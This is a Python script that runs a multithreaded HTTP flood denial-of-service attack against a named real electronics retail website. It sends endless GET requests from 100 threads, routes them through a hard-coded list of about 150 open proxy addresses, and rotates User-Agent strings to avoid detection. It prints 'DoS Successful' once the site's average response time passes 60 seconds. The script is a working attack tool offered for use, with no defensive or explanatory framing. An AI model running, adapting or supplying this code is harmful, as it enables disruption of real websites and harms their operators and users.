#!/usr/bin/env python3

import requests
import threading
import time
import random
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

# Initialize User Agents
print("Initializing User Agents...")

software_names = [SoftwareName.CHROME.value, SoftwareName.ANDROID.value]
operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]

user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems)

# List of proxies
PROXIES_LIST = [
    "3.9.71.167:3128", "218.98.160.110:12798", "44.226.29.99:1080", "8.130.34.237:1080", 
"39.104.59.56:8080", "44.226.167.102:1080", "39.102.208.23:9080", "23.88.116.40:80", 
"148.206.32.3:8080", "47.116.126.57:8081", "39.104.16.201:80", "221.231.13.198:1080", 
"221.153.92.39:80", "8.148.23.202:4000", "120.55.240.71:8647", "116.5.185.131:8888", 
"39.102.214.192:6379", "114.215.127.92:9100", "8.138.82.6:8008", "47.116.181.146:6379", 
"39.102.211.162:5060", "8.138.133.207:9080", "39.102.214.152:9080", "39.102.213.187:9080", 
"39.102.214.208:9999", "39.102.209.128:10000", "164.163.42.24:10000", "164.163.42.34:10000", 
"121.43.109.88:8081", "164.163.42.1:10000", "185.196.68.106:3128", "85.215.64.49:80", 
"54.67.125.45:3128", "39.104.27.89:8001", "219.65.73.81:80", "18.228.149.161:80", 
"3.123.150.192:80", "8.130.36.245:1311", "54.233.119.172:3128", "164.163.42.15:10000", 
"47.122.61.139:8080", "51.20.50.149:3128", "8.130.37.235:3128", "124.163.236.54:7302", 
"47.92.82.167:3128", "43.201.121.81:80", "18.228.198.164:80", "3.130.65.162:3128", 
"156.244.0.116:4444", "8.138.131.110:8443", "8.146.200.53:8008", "13.37.89.201:80", 
"13.36.87.105:3128", "13.37.73.214:3128", "13.38.153.36:80", "13.48.109.48:3128", 
"47.89.159.212:137", "120.25.189.254:8800", "52.26.114.229:3128", "3.78.92.159:3128", 
"39.102.211.64:8081", "51.20.19.159:3128", "8.211.194.78:8443", "65.1.244.232:3128", 
"121.43.146.222:9098", "13.126.79.133:1080", "35.161.172.205:3128", "47.119.22.92:8443", 
"47.119.22.92:8008", "3.97.167.115:3128", "3.141.217.225:80", "47.120.0.231:3128", 
"39.104.69.76:8008", "3.130.65.162:80", "3.12.144.146:80", "34.215.74.117:80", 
"52.16.232.164:3128", "31.47.58.37:80", "47.104.27.165:8090", "52.196.1.182:80", 
"3.212.148.199:3128", "13.55.210.141:3128", "54.228.164.102:3128", "34.215.74.117:1080", 
"35.161.172.205:1080", "8.130.90.177:80", "52.35.240.119:1080", "18.134.236.231:1080", 
"8.130.74.114:80", "101.200.158.109:3128", "47.121.182.88:8090", "63.32.1.88:3128", 
"47.99.112.148:8080", "47.91.89.3:1000", "47.122.65.254:3128", "121.43.154.123:80", 
"27.109.215.216:80", "156.244.11.6:82", "8.148.24.225:8080", "18.133.16.21:3128", 
"47.122.31.238:9080", "47.92.152.43:7890", "47.119.20.8:8081", "185.101.16.52:80", 
"47.104.27.249:8008", "8.148.20.126:9098", "8.213.197.208:9098", "39.105.200.46:8888", 
"18.133.16.21:80", "8.137.38.48:4000", "54.212.22.168:3128", "164.163.42.18:10000", 
"8.130.34.44:4000", "47.121.182.36:8888", "47.105.122.72:8008", "20.204.43.57:80", 
"43.200.77.128:3128", "47.122.60.157:30001", "47.237.107.41:5060", "164.163.42.6:10000", 
"115.239.234.43:7302", "39.102.213.50:10002", "164.163.42.36:10000", "39.104.23.154:9080", 
"47.119.19.221:8085", "47.108.159.113:8080", "112.86.55.159:81", "39.104.57.33:8080", 
"39.102.213.3:9098", "47.252.18.37:9080", "47.109.83.196:8888", "47.122.60.73:8080", 
"47.121.183.107:3128", "139.224.186.221:1111", "47.92.143.92:5060", "8.148.4.166:9098", 
"39.104.16.201:8443", "101.201.225.47:80", "47.122.5.165:7302", "39.100.88.89:6379", 
"39.102.213.187:30000", "8.137.13.191:80", "39.102.211.162:80", "59.110.139.72:9030", 
"8.138.133.207:9098", "61.91.162.126:8080", "93.171.157.249:8080", "8.130.74.114:8081", 
"164.163.42.2:10000", "47.100.254.82:80", "101.71.143.237:8092", "106.15.194.169:9100", 
"164.163.42.33:10000", "177.234.209.87:999", "65.1.40.47:80", "65.1.244.232:80"

]

# Lists to track response and request data
response_times = []
request_logs = []

# Function to get current time in milliseconds
def current_mil_time():
    return round(time.time() * 1000)

def current_sec_time():
    return round(time.time())

# Function to count responses per second
def count_resp_per_sec(time_took):
    t = current_sec_time()
    response_times.append({"time_took": time_took, "time_received": t})

    for e in response_times:
        if current_sec_time() - e["time_received"] >= 1:
            response_times.remove(e)

# Function to count requests per second
def count_req_per_sec():
    t = current_sec_time()
    request_logs.append({"time_received": t})

    for e in request_logs:
        if current_sec_time() - e["time_received"] >= 1:
            request_logs.remove(e)

# Function to make requests using a rotating proxy
def make_request(name):
    while True:
        count_req_per_sec()
        proxy = random.choice(PROXIES_LIST)  # Select a random proxy
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        
        try:
            s = current_mil_time()
            headers = {'User-Agent': user_agent_rotator.get_random_user_agent()}

            r = requests.get(
                'https://www.electronicscomp.com/', 
                headers=headers, 
                proxies=proxies,  # Use random proxy
                timeout=10
            )

            t = current_mil_time() - s
            count_resp_per_sec(t)
            print(f"Thread #{name} - Proxy: {proxy} - Response Code: {r.status_code} | Response Time: {t} ms")

        except requests.exceptions.RequestException:
            print(f"Thread #{name} - Proxy {proxy} failed. Trying another...")

if __name__ == "__main__":
    threads = 100  # Adjust as needed
    i = 0

    while i < threads:
        x = threading.Thread(target=make_request, args=(i,))
        print(f"Starting thread #{i}...")
        x.start()
        i += 1

    print("Calculating... wait for a while for it to adjust...")

    while True:
        time.sleep(0.1)
        response_time = sum([e['time_took'] for e in response_times]) / len(response_times) if response_times else 0

        if response_time > 60000:  # If response time > 60 seconds
            message = "DoS Successful. Site looks down for now."
        else:
            message = "DoSing..."

        print(f"\rAverage Response Time: {round(response_time, 2)} ms | Requests/sec: {len(request_logs)} | {message}", end="", flush=True)
